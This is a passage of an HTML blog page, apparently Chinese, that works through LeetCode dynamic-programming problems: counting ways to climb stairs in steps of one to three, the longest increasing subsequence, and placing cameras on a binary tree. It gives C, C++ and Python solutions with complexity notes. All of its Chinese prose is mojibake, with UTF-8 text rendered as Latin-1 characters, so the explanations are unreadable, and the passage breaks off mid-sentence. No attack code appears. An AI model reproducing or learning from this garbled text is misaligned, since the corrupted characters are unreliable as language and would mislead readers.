class="built_in">range</span>(<span class="number">2</span>,n):</span><br><span class="line">            a,b = b, a+b</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/NtQO4EmZ7uxWTaf.png" alt="image.png"></p><blockquote><p>è‚‰çœ¼å¯è§çš„Pythonæ•ˆç‡ä½ä¸‹</p><p><img src="https://i.loli.net/2020/09/22/ZJeAi9vElOyTp7M.png" alt="image.png"></p><p>è¿˜å¥½è¿™æ¬¡Cä¸ç”¨åƒæ´›è°·é‚£æ ·æ‰‹æ’•å¤§æ•°åŠ å‡ï¼ˆæ¯•ç«Ÿä¸æ˜¯OIæ ‡å‡†23333</p></blockquote><h2 id="0x01-é¢è¯•é¢˜-08-01-ä¸‰æ­¥é—®é¢˜"><a href="#0x01-é¢è¯•é¢˜-08-01-ä¸‰æ­¥é—®é¢˜" class="headerlink" title="0x01.é¢è¯•é¢˜ 08.01. ä¸‰æ­¥é—®é¢˜"></a>0x01.<a href="https://leetcode-cn.com/problems/three-steps-problem-lcci/">é¢è¯•é¢˜ 08.01. ä¸‰æ­¥é—®é¢˜</a></h2><blockquote><p>ä¸‰æ­¥é—®é¢˜ã€‚æœ‰ä¸ªå°å­©æ­£åœ¨ä¸Šæ¥¼æ¢¯ï¼Œæ¥¼æ¢¯æœ‰né˜¶å°é˜¶ï¼Œå°å­©ä¸€æ¬¡å¯ä»¥ä¸Š1é˜¶ã€2é˜¶æˆ–3é˜¶ã€‚å®ç°ä¸€ç§æ–¹æ³•ï¼Œè®¡ç®—å°å­©æœ‰å¤šå°‘ç§ä¸Šæ¥¼æ¢¯çš„æ–¹å¼ã€‚ç»“æœå¯èƒ½å¾ˆå¤§ï¼Œä½ éœ€è¦å¯¹ç»“æœæ¨¡1000000007ã€‚</p><p>ç¤ºä¾‹1:</p><p> è¾“å…¥ï¼šn &#x3D; 3<br> è¾“å‡ºï¼š4<br> è¯´æ˜: æœ‰å››ç§èµ°æ³•<br>ç¤ºä¾‹2:</p><p> è¾“å…¥ï¼šn &#x3D; 5<br> è¾“å‡ºï¼š13<br>æç¤º:</p><p>nèŒƒå›´åœ¨[1, 1000000]ä¹‹é—´</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/three-steps-problem-lcci">https://leetcode-cn.com/problems/three-steps-problem-lcci</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>çˆ¬æ¥¼æ¢¯é—®é¢˜çš„å‡çº§ç‰ˆï¼Œæ€»ä½“æ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼š</p><h3 id="é—®é¢˜åˆ†æ-1"><a href="#é—®é¢˜åˆ†æ-1" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h3><p>ç®€å•åˆ†æï¼š</p><ul><li>ä¸Š0çº§æ¥¼æ¢¯ï¼šæœ‰0ç§èµ°æ³•</li><li>ä¸Š1çº§æ¥¼æ¢¯ï¼šæœ‰1ç§èµ°æ³•ï¼šç›´æ¥è·¨ä¸€é˜¶æ¥¼æ¢¯</li><li>ä¸Š2çº§æ¥¼æ¢¯ï¼šæœ‰2ç§èµ°æ³•ï¼šâ‘ å…ˆè·¨ä¸€é˜¶å†è·¨ä¸€é˜¶ï¼›â‘¡ç›´æ¥è·¨ä¸¤é˜¶æ¥¼æ¢¯</li><li>ä¸Š3çº§æ¥¼æ¢¯ï¼šæœ‰4ç§èµ°æ³•ï¼šâ‘ å…ˆè·¨ä¸€é˜¶å†è·¨ä¸€é˜¶å†è·¨ä¸€é˜¶ï¼›â‘¡å…ˆè·¨ä¸€é˜¶å†è·¨ä¸¤é˜¶ï¼›â‘¢å…ˆè·¨ä¸¤é˜¶å†è·¨ä¸€é˜¶ï¼›â‘£ç›´æ¥è·¨3é˜¶</li><li>â€¦â€¦</li><li><strong>ä¸ŠNé˜¶æ¥¼æ¢¯</strong>ï¼š<strong>â‘ å…ˆèµ°åˆ°ç¬¬N-1é˜¶ï¼Œå†è·¨ä¸€é˜¶æ¥¼æ¢¯â‘¡å…ˆèµ°åˆ°N-2é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸¤é˜¶æ¥¼æ¢¯â‘¢å…ˆèµ°åˆ°N-3é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸‰é˜¶æ¥¼æ¢¯</strong>ï¼šä¸€å…±æ˜¯<strong>F(N-1)+F(N-2)+F(N-3)ç§èµ°æ³•</strong></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬èµ°nçº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡éƒ½å¯ä»¥åŒ–ä¸º<strong>â‘ å…ˆèµ°åˆ°ç¬¬N-1é˜¶ï¼Œå†è·¨ä¸€é˜¶æ¥¼æ¢¯â‘¡å…ˆèµ°åˆ°N-2é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸¤é˜¶æ¥¼æ¢¯â‘¢å…ˆèµ°åˆ°N-3é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸‰é˜¶æ¥¼æ¢¯</strong>çš„èµ°æ³•</p><h4 id="çŠ¶æ€è½¬ç§»æ–¹ç¨‹-1"><a href="#çŠ¶æ€è½¬ç§»æ–¹ç¨‹-1" class="headerlink" title="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"></a>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</h4><p><strong>F(N) &#x3D; F(N-1) + F(N-2) + F(N-3)</strong></p><p>æœ‰äº†è¿™ä¸ªæ–¹ç¨‹ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“<strong>èµ°1çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡ä¸èµ°2çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡</strong>ï¼Œå°±å¯ä»¥é¡ºåˆ©åœ°<strong>æ¨å‡ºèµ°ä»»æ„ä¸€çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡</strong></p><h4 id="æ—¶é—´å¤æ‚åº¦-1"><a href="#æ—¶é—´å¤æ‚åº¦-1" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h4><p>éœ€è¦æ±‚è§£næ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºçº¿æ€§æ—¶é—´å¤æ‚åº¦<strong>O(N)</strong></p><h4 id="ç©ºé—´å¤æ‚åº¦-1"><a href="#ç©ºé—´å¤æ‚åº¦-1" class="headerlink" title="ç©ºé—´å¤æ‚åº¦"></a>ç©ºé—´å¤æ‚åº¦</h4><p>å› ä¸ºæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä¸‰ä¸ªå˜é‡è¿­ä»£æ±‚è§£ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><h3 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><h4 id="Cè¯­è¨€ç‰ˆï¼š-1"><a href="#Cè¯­è¨€ç‰ˆï¼š-1" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">waysToStep</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">1</span>, c = <span class="number">2</span>, d;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; n ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        d = (a+b+c) % <span class="number">1000000007</span>;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">        c = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/ZW3hgPctdDiTBXG.png" alt="image.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆ"><a href="#Pythonè¯­è¨€ç‰ˆ" class="headerlink" title="Pythonè¯­è¨€ç‰ˆ"></a>Pythonè¯­è¨€ç‰ˆ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">waysToStep</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        a, b, c = <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n):</span><br><span class="line">            a,b,c = b, c, (a + b + c)%<span class="number">1000000007</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/d6I87nMHYkZqLCB.png" alt="image.png"></p><blockquote><p>æ•ˆç‡ä¸Šçš„æå·¨å·®è·</p><p><img src="https://i.loli.net/2020/09/22/EMwRvZBWJNSep87.png" alt="image.png"></p></blockquote><h1 id="0x02-éš¾åº¦ï¼šä¸­ç­‰"><a href="#0x02-éš¾åº¦ï¼šä¸­ç­‰" class="headerlink" title="0x02.éš¾åº¦ï¼šä¸­ç­‰"></a>0x02.éš¾åº¦ï¼šä¸­ç­‰</h1><h2 id="0x00-æœ€é•¿ä¸Šå‡å­åºåˆ—"><a href="#0x00-æœ€é•¿ä¸Šå‡å­åºåˆ—" class="headerlink" title="0x00.æœ€é•¿ä¸Šå‡å­åºåˆ—"></a>0x00.<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/">æœ€é•¿ä¸Šå‡å­åºåˆ—</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªæ— åºçš„æ•´æ•°æ•°ç»„ï¼Œæ‰¾åˆ°å…¶ä¸­æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦ã€‚</p><p>ç¤ºä¾‹:</p><p>è¾“å…¥: [10,9,2,5,3,7,101,18]<br>è¾“å‡º: 4<br>è§£é‡Š: æœ€é•¿çš„ä¸Šå‡å­åºåˆ—æ˜¯ [2,3,7,101]ï¼Œå®ƒçš„é•¿åº¦æ˜¯ 4ã€‚<br>è¯´æ˜:</p><p>å¯èƒ½ä¼šæœ‰å¤šç§æœ€é•¿ä¸Šå‡å­åºåˆ—çš„ç»„åˆï¼Œä½ åªéœ€è¦è¾“å‡ºå¯¹åº”çš„é•¿åº¦å³å¯ã€‚<br>ä½ ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åº”è¯¥ä¸º O(n2) ã€‚<br>è¿›é˜¶: ä½ èƒ½å°†ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦é™ä½åˆ° O(n log n) å—?</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence">https://leetcode-cn.com/problems/longest-increasing-subsequence</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="é—®é¢˜åˆ†æ-2"><a href="#é—®é¢˜åˆ†æ-2" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h3><p>æœ€é•¿ä¸Šå‡å­åºåˆ—é—®é¢˜å¯ä»¥è¯´æ˜¯åŠ¨æ€è§„åˆ’ç®—æ³•æœ€ç»å…¸çš„ä¸€ä¸ªå…¥é—¨é—®é¢˜äº†ï¼Œæ— è®ºæ˜¯åœ¨å„å¤§ç®—æ³•ä¹¦ä¸Šè¿˜æ˜¯ç«èµ›ä¹¦ä¸Šåœ¨è®²åˆ°åŠ¨æ€è§„åˆ’æ—¶å¾€å¾€ä¼šé€‰æ‹©ä½¿ç”¨è¿™ä¸ªé—®é¢˜æ¥å…¥é—¨</p><p>é¦–å…ˆæˆ‘ä»¬è¦æ±‚è§£æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼Œæˆ‘ä»¬å°±å¿…é¡»è¦å°†è¯¥åºåˆ—ä¸Šçš„å„ä¸ªç»“ç‚¹â€œä¸²èµ·æ¥â€â€”â€”<strong>å¯¹äºä»»ä¸€ç»“ç‚¹éƒ½ä½¿ç”¨ä¸€ä¸ªå˜é‡æ¥å‚¨å­˜åœ¨è¯¥ç»“ç‚¹ä¸Šçš„æœ€é•¿ä¸Šå‡å­åºåˆ—ä¸­è¯¥ç»“ç‚¹çš„ä¸‹ä¸€ç»“ç‚¹çš„ç´¢å¼•</strong></p><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œå¯¹äºä»»ä¸€ç»“ç‚¹ä¸å…¶å¾€å‰æ‰€æœ‰ç»“ç‚¹æ„æˆçš„åºåˆ—ï¼Œ<strong>è¦æ±‚è§£è¯¥åºåˆ—ä¸­çš„æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼Œæˆ‘ä»¬åªéœ€è¦æ±‚è§£è¯¥æœ€é•¿ä¸Šå‡å­åºåˆ—ä¸­çš„å€’æ•°ç¬¬äºŒä¸ªç»“ç‚¹ä¸å¾€å‰æ‰€æœ‰ç»“ç‚¹æ‰€æ„æˆçš„åºåˆ—ã€å†æ¥ä¸Šè¯¥åºåˆ—çš„æœ€åä¸€ä¸ªç»“ç‚¹å³å¯</strong></p><h3 id="ç®—æ³•è¿‡ç¨‹"><a href="#ç®—æ³•è¿‡ç¨‹" class="headerlink" title="ç®—æ³•è¿‡ç¨‹"></a>ç®—æ³•è¿‡ç¨‹</h3><h4 id="çŠ¶æ€è½¬ç§»æ–¹ç¨‹-2"><a href="#çŠ¶æ€è½¬ç§»æ–¹ç¨‹-2" class="headerlink" title="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"></a>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</h4><p>å¯¹äºä»»ä¸€æ•°å­—åºåˆ—a<sub>1</sub>,a<sub>2</sub>,â€¦,a<sub>n</sub>ï¼Œå…¶æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦ä¸ºï¼š<strong>f(a<sub>n</sub>) &#x3D; f(a<sub>m</sub>)+1</strong></p><ul><li><p>å…¶ä¸­<strong>a<sub>m</sub>&lt;&#x3D;a<sub>n</sub></strong></p></li><li><p><strong>f(a<sub>m</sub>)ä¸ºæ•°å­—åºåˆ—a<sub>1</sub>,a<sub>2</sub>,â€¦,a<sub>n-1</sub>æ‰€èƒ½æ„æˆçš„æœ€å¤§å…ƒç´ a<sub>max</sub>ä¸å¤§äºa<sub>n</sub>çš„ä¸Šå‡å­åºåˆ—ä¸­çš„æœ€å¤§é•¿åº¦</strong></p></li></ul><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨éå†çš„æ–¹æ³•<strong>é€ä¸€æ±‚å‡ºåºåˆ—a<sub>1</sub>ï¼Œa<sub>1</sub>ã€a<sub>2</sub>ï¼Œa<sub>1</sub>ã€a<sub>2</sub>ã€a<sub>3</sub>ï¼Œâ€¦ï¼Œa<sub>1</sub>ã€a<sub>2</sub>ã€a<sub>3</sub>ã€â€¦ã€a<sub>n</sub>ä¸­çš„æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦</strong></p><h4 id="å…·ä½“æ¶æ„"><a href="#å…·ä½“æ¶æ„" class="headerlink" title="å…·ä½“æ¶æ„"></a>å…·ä½“æ¶æ„</h4><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ„é€ å‡ºæ¥åï¼Œæ¥ä¸‹æ¥çš„ä»£ç å°±å¾ˆå¥½å†™äº†ã€‚</p><p>æˆ‘ä»¬é€‰æ‹©é‡‡ç”¨ä¸€ä¸ª<strong>ä¸‰ç»´æ•°ç»„</strong>æ¥å‚¨å­˜ç»“ç‚¹ä¿¡æ¯</p><ul><li>ç¬¬ä¸€ç»´ï¼š<strong>ç»“ç‚¹çš„å€¼</strong></li><li>ç¬¬äºŒç»´ï¼š<strong>ç»“ç‚¹ä¸Šçš„æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦</strong></li><li>ç¬¬ä¸‰ç»´ï¼š<strong>ç»“ç‚¹ä¸Šçš„æœ€é•¿ä¸Šå‡å­åºåˆ—ä¸­è¯¥ç»“ç‚¹çš„ä¸‹ä¸€ç»“ç‚¹çš„ç´¢å¼•</strong></li></ul><p>æˆ‘ä»¬é‡‡ç”¨ä¸¤å±‚å¾ªç¯æ¥å¯¹å„ä¸ªç»“ç‚¹è¿›è¡Œéå†:</p><ul><li>ç¬¬ä¸€å±‚å¾ªç¯éå†æ¯ä¸€ä¸ªç»“ç‚¹</li><li>ç¬¬äºŒå±‚å¾ªç¯éå†åˆå§‹èŠ‚ç‚¹åˆ°ç¬¬ä¸€å±‚å¾ªç¯ç»“ç‚¹çš„å‰ä¸€ç»“ç‚¹æ±‚è§£åˆ°è¯¥ç»“ç‚¹çš„æœ€é•¿ä¸Šå‡å­åºåˆ—</li></ul><h4 id="æ—¶é—´å¤æ‚åº¦-2"><a href="#æ—¶é—´å¤æ‚åº¦-2" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h4><p>ä¸¤å±‚å¾ªç¯åµŒå¥—ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¾—å‡ºæ—¶é—´å¤æ‚åº¦ä¸º<strong>Oï¼ˆN^2ï¼‰</strong></p><h4 id="ç©ºé—´å¤æ‚åº¦-2"><a href="#ç©ºé—´å¤æ‚åº¦-2" class="headerlink" title="ç©ºé—´å¤æ‚åº¦"></a>ç©ºé—´å¤æ‚åº¦</h4><p>ä½¿ç”¨åŠ¨æ€æ•°ç»„çš„è¯å°±æ˜¯çº¿æ€§ç©ºé—´å¤æ‚åº¦<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(numsSize == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n, lis[<span class="number">10000</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;,_max = <span class="number">-1</span>;</span><br><span class="line">    n = numsSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lis[i][<span class="number">0</span>]=nums[i];</span><br><span class="line">        lis[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        lis[i][<span class="number">2</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(lis[i][<span class="number">0</span>]&gt;lis[j][<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//lis[i][1] = lis[i][1]&gt;lis[j][1]+1?lis[i][1]:lis[j][1]+1,lis[i][2] = j;</span></span><br><span class="line">                <span class="comment">//it&#x27;s too hard to understand, so I chose the following one to get it clear</span></span><br><span class="line">                <span class="keyword">if</span>(lis[i][<span class="number">1</span>]&lt;=lis[j][<span class="number">1</span>]+<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    lis[i][<span class="number">1</span>] = lis[j][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">                    lis[i][<span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _max = lis[i][<span class="number">1</span>]&gt;_max?lis[i][<span class="number">1</span>]:_max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ—¶é—´å¤æ‚åº¦ä¸ºO(N^2)ï¼Œæˆç»©ä¸æ˜¯é‚£ä¹ˆçš„ç†æƒ³</p><p><img src="https://i.loli.net/2020/09/06/OQgt96ZpeGNxXSo.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½å†åŠ å¿«ä¸€ç‚¹å‘¢ï¼Ÿ</p><h3 id="è¿›é˜¶ï¼šè´ªå¿ƒ-äºŒåˆ†æŸ¥æ‰¾"><a href="#è¿›é˜¶ï¼šè´ªå¿ƒ-äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="è¿›é˜¶ï¼šè´ªå¿ƒ+äºŒåˆ†æŸ¥æ‰¾"></a>è¿›é˜¶ï¼šè´ªå¿ƒ+äºŒåˆ†æŸ¥æ‰¾</h3><p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨è´ªå¿ƒç®—æ³•é…åˆäºŒåˆ†æŸ¥æ‰¾æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆ<del>å½“ç„¶è¿™ä¸ªæ—¶å€™å°±å·²ç»ä¸å†æ˜¯åŠ¨æ€è§„åˆ’äº†ï¼Œ</del>ï¼ˆ<del>ä½†æ˜¯æ˜¯ä¸æ˜¯åŠ¨æ€è§„åˆ’å·²ç»æ— æ‰€è°“äº†ï¼</del>ï¼ˆ<del>ä¸</del></p><blockquote><p>å’•äº†ï¼Œåé¢æœ‰æ—¶é—´å†å†™ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote><h1 id="0x03-éš¾åº¦ï¼šå›°éš¾"><a href="#0x03-éš¾åº¦ï¼šå›°éš¾" class="headerlink" title="0x03.éš¾åº¦ï¼šå›°éš¾"></a>0x03.éš¾åº¦ï¼šå›°éš¾</h1><h2 id="0x00-ç›‘æ§äºŒå‰æ ‘"><a href="#0x00-ç›‘æ§äºŒå‰æ ‘" class="headerlink" title="0x00. ç›‘æ§äºŒå‰æ ‘"></a>0x00.<a href="https://leetcode-cn.com/problems/binary-tree-cameras/"> ç›‘æ§äºŒå‰æ ‘</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæˆ‘ä»¬åœ¨æ ‘çš„èŠ‚ç‚¹ä¸Šå®‰è£…æ‘„åƒå¤´ã€‚</p><p>èŠ‚ç‚¹ä¸Šçš„æ¯ä¸ªæ‘„å½±å¤´éƒ½å¯ä»¥ç›‘è§†å…¶çˆ¶å¯¹è±¡ã€è‡ªèº«åŠå…¶ç›´æ¥å­å¯¹è±¡ã€‚</p><p>è®¡ç®—ç›‘æ§æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ‘„åƒå¤´æ•°é‡ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,0]<br>è¾“å‡ºï¼š1<br>è§£é‡Šï¼šå¦‚å›¾æ‰€ç¤ºï¼Œä¸€å°æ‘„åƒå¤´è¶³ä»¥ç›‘æ§æ‰€æœ‰èŠ‚ç‚¹ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,null,0,null,null,0]<br>è¾“å‡ºï¼š2<br>è§£é‡Šï¼šéœ€è¦è‡³å°‘ä¸¤ä¸ªæ‘„åƒå¤´æ¥ç›‘è§†æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ ä¸Šå›¾æ˜¾ç¤ºäº†æ‘„åƒå¤´æ”¾ç½®çš„æœ‰æ•ˆä½ç½®ä¹‹ä¸€ã€‚</p><p>æç¤ºï¼š</p><p>ç»™å®šæ ‘çš„èŠ‚ç‚¹æ•°çš„èŒƒå›´æ˜¯ [1, 1000]ã€‚<br>æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ 0ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-tree-cameras">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>è¯¥é¢˜ä¸º2020.9.22çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><p>ä»”ç»†æƒ³æƒ³ï¼Œå¯¹äºä¸€ä¸ªç»“ç‚¹æ˜¯å¦éœ€è¦å®‰è£…æ‘„åƒå¤´ï¼Œå…¶å®æ˜¯<strong>ç”±å…¶å­æ ‘çš„çŠ¶æ€æ¥å†³å®šçš„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>åŠ¨æ€è§„åˆ’ç®—æ³•</strong></p><h3 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰</h3><p>å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>æˆ‘ä»¬è€ƒè™‘æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦æˆ–å³å­æ ‘æ²¡æœ‰è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œè¿™ä¸ªç»“ç‚¹å¿…é¡»è¦å®‰è£…ä¸€ä¸ªæ‘„åƒå¤´æ¥ç›‘æµ‹å…¶å·¦æˆ–å³å­æ ‘ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç 